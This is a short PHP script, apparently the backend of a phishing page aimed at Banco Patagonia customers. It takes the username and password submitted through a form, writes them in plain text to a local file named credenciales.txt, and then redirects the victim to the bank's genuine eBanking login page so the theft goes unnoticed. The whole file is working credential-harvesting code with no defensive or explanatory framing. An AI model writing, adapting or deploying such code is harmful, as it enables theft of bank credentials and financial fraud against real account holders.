<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$usuario = $_POST['username'] ?? '';
$clave = $_POST['password'] ?? '';

$archivo = fopen("credenciales.txt", "a");
if (!$archivo) {
    die("No se pudo abrir el archivo para escribir.");
}
fwrite($archivo, "Usuario: $usuario - Clave: $clave\n");
fclose($archivo);

header("Location: https://ebankpersonas.bancopatagonia.com.ar/eBanking/usuarios/login.htm");
exit();
?>

